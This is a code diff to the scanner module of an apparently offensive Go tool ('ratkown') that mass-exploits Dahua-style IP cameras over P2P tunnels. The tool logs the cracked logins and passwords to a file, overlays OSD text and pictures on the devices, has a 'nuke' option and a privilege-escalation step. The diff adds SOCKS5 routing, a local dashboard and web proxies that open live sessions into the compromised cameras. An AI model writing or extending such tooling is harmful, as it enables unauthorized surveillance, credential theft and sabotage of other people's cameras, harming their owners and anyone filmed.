@@ -2,15 +2,11 @@ package scan
 
 import (
 	"fmt"
+	"github.com/fatih/color"
 	"math"
 	"os"
 	"os/signal"
 	"path/filepath"
-	"strings"
-	"sync"
-	"syscall"
-	"time"
-	"github.com/fatih/color"
 	"ratkown/ratkown/config"
 	"ratkown/ratkown/dhip"
 	"ratkown/ratkown/exploit"
@@ -19,6 +15,10 @@ import (
 	"ratkown/ratkown/osd"
 	"ratkown/ratkown/types"
 	"ratkown/ratkown/ui"
+	"strings"
+	"sync"
+	"syscall"
+	"time"
 )
 
 var (
@@ -27,13 +27,13 @@ var (
 )
 
 type Scanner struct {
-	Targets     []string
-	Config      *types.Config
-	Threads     int
-	OutDir      string
-	InputSource string
-	NukeArmed   bool
-	UnmaskFirst bool
+	Targets      []string
+	Config       *types.Config
+	Threads      int
+	OutDir       string
+	InputSource  string
+	NukeArmed    bool
+	UnmaskFirst  bool
 	ForceosdMode bool
 
 	TotalCount     int64
@@ -55,13 +55,17 @@ type Scanner struct {
 	lastCompleted int64
 	lastRate      int64
 
-	mu         sync.Mutex
-	wg         sync.WaitGroup
-	snapshotWg sync.WaitGroup
-	cancelOnce sync.Once
-	pwnedList  []types.ExploitResult
-	cancelChan chan struct{}
-	provided map[string]types.ProvidedCred
+	mu            sync.Mutex
+	wg            sync.WaitGroup
+	snapshotWg    sync.WaitGroup
+	cancelOnce    sync.Once
+	pwnedList     []types.ExploitResult
+	cancelChan    chan struct{}
+	provided      map[string]types.ProvidedCred
+	WebProxy      bool
+	DashboardPort int
+	webMu         sync.Mutex
+	webProxies    []webProx
 }
 
 func NewScanner(targets []string, config *types.Config, threads int, outDir string, inputSource string, nukeArmed bool, provided []types.ProvidedCred) *Scanner {
@@ -112,6 +116,9 @@ func isPrefix(target string) bool {
 
 func (s *Scanner) Run() {
 	ui.TUIInit()
+	if s.DashboardPort > 0 {
+		ui.TUIThread(fmt.Sprintf("[web] dashboard at http://127.0.0.1:%d", s.DashboardPort))
+	}
 
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
@@ -163,7 +170,8 @@ func (s *Scanner) Run() {
 	}
 	s.unitExtra = 0
 	osdPossible := s.Config.Overlay.Osd && (osd.NormalizeOSDChannel(s.Config.Overlay.Channel) != "" || len(osd.NormalizeOSDLines(s.Config.Overlay.Custom)) > 0)
-	if osdPossible || (s.NukeArmed && s.Config.Nuke.Enabled()) {
+	picPossible := s.Config.Overlay.Picture && s.Config.Overlay.PictureFile != ""
+	if osdPossible || picPossible || (s.NukeArmed && s.Config.Nuke.Enabled()) {
 		s.unitExtra = 1
 	}
 	s.unitTotal = 1 + s.unitSnap + s.unitExtra
@@ -286,7 +294,7 @@ func (s *Scanner) Run() {
 		}
 	}
 
-	cleanup:
+cleanup:
 	pipe.Close()
 	verdictWg.Wait()
 	close(onlineChan)
@@ -295,7 +303,7 @@ func (s *Scanner) Run() {
 	s.cancelOnce.Do(func() { close(s.cancelChan) })
 	s.printProgress()
 	if ui.TUIActive() {
-			ui.TUIStats(s.doneUnits, s.totalUnits, s.AliveVerdicts, s.OnlineCount, s.WasteCount, s.PwnedCount, s.lastRate, s.CompletedCount, time.Since(s.startTime))
+		ui.TUIStats(s.doneUnits, s.totalUnits, s.AliveVerdicts, s.OnlineCount, s.WasteCount, s.PwnedCount, s.lastRate, s.CompletedCount, time.Since(s.startTime))
 		ui.TUIShutdown()
 	}
 	fmt.Println()
@@ -303,6 +311,29 @@ func (s *Scanner) Run() {
 	ui.LogScanFinish(s.CompletedCount, s.PwnedCount, s.OnlineCount, s.WasteCount, s.TotalCount)
 	doneTimeStr := time.Now().Format("15:04:05")
 	scanGreen.Printf("[%s] Done\n", doneTimeStr)
+
+	s.webMu.Lock()
+	proxies := make([]webProx, len(s.webProxies))
+	copy(proxies, s.webProxies)
+	s.webMu.Unlock()
+	if s.DashboardPort > 0 {
+		nc := WebCamCount()
+		plural := "s"
+		if nc == 1 {
+			plural = ""
+		}
+		fmt.Println()
+		scanGreen.Printf("[web] http://127.0.0.1:%d (%d cam%s)\n", s.DashboardPort, nc, plural)
+		select {}
+	}
+	if len(proxies) > 0 {
+		fmt.Println()
+		scanGreen.Printf("[web] %d live web sessions (Ctrl+C closes all):\n", len(proxies))
+		for _, p := range proxies {
+			fmt.Printf("  http://127.0.0.1:%d -> %s\n", p.port, p.serial)
+		}
+		select {}
+	}
 }
 
 func tryType0Tunnel(serial string, retries int, timeout time.Duration) *net.DHClient {
@@ -495,7 +526,7 @@ func (s *Scanner) processOnlineClient(serial string, client *net.DHClient) {
 	}
 
 	for attempt := 0; attempt < retries; attempt++ {
-		directOK := true
+		directOK := !net.Socks5Enabled()
 		err := client.EstablishDirectP2P()
 		if err != nil {
 			directOK = false
@@ -647,6 +678,20 @@ func (s *Scanner) handlePwnedResult(serial, ip string, res *types.ExploitResult,
 				activeTunnel.Disconnect()
 			}
 			cleanup()
+		}
+	}
+
+	if s.WebProxy && activeTunnel != nil && res != nil && res.Login != "" && res.Password != "" {
+		port, stop, werr := startWebProxy(activeTunnel, serial, res.Login, res.Password, s.OutDir)
+		if werr == nil {
+			s.addWebProxy(serial, port, stop)
+			if s.DashboardPort > 0 {
+				WebCamSetProxy(serial, port)
+			}
+			ui.DebugLogf("web", "%s > local web proxy on 127.0.0.1:%d", serial, port)
+			osdCleanup = func() {}
+		} else {
+			ui.DebugLogf("web", "%s > proxy failed: %v", serial, werr)
 		}
 	}
 
@@ -911,7 +956,7 @@ func (s *Scanner) dialFreshTunnel(serial string, res *types.ExploitResult) (*net
 				continue
 			}
 		}
-		directOK := true
+		directOK := !net.Socks5Enabled()
 		if err := client.EstablishDirectP2P(); err != nil {
 			directOK = false
 			if err = client.CompleteRelayHandshake(); err != nil {
@@ -1009,7 +1054,7 @@ func (s *Scanner) launchSnapshot(serial string, res *types.ExploitResult) bool {
 					continue
 				}
 			}
-			directOK := true
+			directOK := !net.Socks5Enabled()
 			if err := client.EstablishDirectP2P(); err != nil {
 				directOK = false
 				if err = client.CompleteRelayHandshake(); err != nil {
@@ -1074,6 +1119,8 @@ func (s *Scanner) launchExtras(serial string, tunnel *net.PTCPTunnel, res *types
 	channel := osd.NormalizeOSDChannel(s.Config.Overlay.Channel)
 	lines := osd.NormalizeOSDLines(s.Config.Overlay.Custom)
 	osdOn := s.Config.Overlay.Osd && (channel != "" || len(lines) > 0)
+	picOn := s.Config.Overlay.Picture && s.Config.Overlay.PictureFile != ""
+	ui.DebugLogf("extras", "%s > nukeOn=%v osdOn=%v picOn=%v", serial, nukeOn, osdOn, picOn)
 
 	if osdOn {
 		channel = osd.ExpandOSDTemplate(channel, serial, res.Model, "", "")
@@ -1082,7 +1129,7 @@ func (s *Scanner) launchExtras(serial string, tunnel *net.PTCPTunnel, res *types
 		}
 	}
 
-	if !nukeOn && !osdOn {
+	if !nukeOn && !osdOn && !picOn {
 		if cleanup != nil {
 			cleanup()
 		}
@@ -1104,6 +1151,13 @@ func (s *Scanner) launchExtras(serial string, tunnel *net.PTCPTunnel, res *types
 		if until := net.DeviceLockedUntil(serial); !until.IsZero() {
 			ui.LogOSDResult(serial, 5000, false, fmt.Errorf("account locked until %s", until.Format("15:04:05")))
 			return
+		}
+		if picOn {
+			if perr := osd.TryPictureTitle(tunnel, res.Login, res.Password, s.Config.Overlay.PictureFile, s.OutDir, serial); perr != nil {
+				ui.LogOSDResult(serial, 80, false, perr)
+			} else {
+				ui.LogOSDResult(serial, 80, true, nil)
+			}
 		}
 		if !osdOn {
 			if nukeOn {
@@ -1226,9 +1280,16 @@ func (s *Scanner) tryPrivesc(tunnel *net.PTCPTunnel, serial string, res *types.E
 }
 
 func (s *Scanner) handlePwned(serial string, res *types.ExploitResult) {
-	ui.LogExploitPwned(serial, res.Method, res.Login, res.Password)
-	ui.TUIEventOwned(serial, res.Password)
+	webAddr := ""
+	if res.IP != "" {
+		webAddr = res.IP + ":80"
+	}
+	ui.LogExploitPwned(serial, res.Method, res.Login, res.Password, webAddr)
+	ui.TUIEventOwned(serial, res.Password, "")
 	ui.TUIPTZAlert(serial, res.Model)
+	if s.DashboardPort > 0 {
+		WebCamAdd(serial, res.IP, res.Login, res.Password, res.Model)
+	}
 	s.mu.Lock()
 	s.PwnedCount++
 	s.pwnedList = append(s.pwnedList, *res)
@@ -1236,8 +1297,13 @@ func (s *Scanner) handlePwned(serial string, res *types.ExploitResult) {
 	allinPath := filepath.Join(s.OutDir, "allin.txt")
 	f, err := os.OpenFile(allinPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err == nil {
-		fmt.Fprintf(f, "%s | %s | %s | %s\n",
-			serial, res.Password, res.Login, res.Model)
+		if webAddr != "" {
+			fmt.Fprintf(f, "%s | %s | %s | %s | http://%s\n",
+				serial, res.Password, res.Login, res.Model, webAddr)
+		} else {
+			fmt.Fprintf(f, "%s | %s | %s | %s\n",
+				serial, res.Password, res.Login, res.Model)
+		}
 		f.Close()
 	}
 
